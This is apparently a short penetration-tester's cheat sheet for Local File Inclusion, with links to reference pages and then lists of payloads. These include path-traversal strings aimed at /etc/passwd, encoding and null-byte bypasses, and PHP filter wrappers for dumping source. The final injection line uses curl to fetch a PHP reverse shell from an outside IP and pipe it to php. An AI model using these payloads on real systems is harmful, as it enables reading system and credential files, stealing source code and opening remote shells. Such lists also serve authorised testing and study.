paTags: #Enumeration #UsefulLinks 
LFI = Local File Inclusion

https://www.acunetix.com/blog/articles/local-file-inclusion-lfi/
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
https://book.hacktricks.xyz/pentesting-web/file-inclusion


```
../../../../../../etc/passwd
..//..//..//..//..//etc/passwd
....\/....\/....\/etc/passwd
..///////..////..//////etc/passwd
/%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../%5C../etc/passwd
```

Null byte (%00)
```
../../../etc/passwd%00
```

Encoding
```
..%252f..%252f..%252fetc%252fpasswd
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
%252e%252e%252fetc%252fpasswd
%252e%252e%252fetc%252fpasswd%00
```

php wrapper
```
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/convert.base64-encode/resource=index.php
pHp://FilTer/convert.base64-encode/resource=index.php

php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
```



```
' and die(show_source('/etc/passwd')) or '


' and die(system("curl http://192.168.45.185/php-reverse-shell.php|php")) or '
```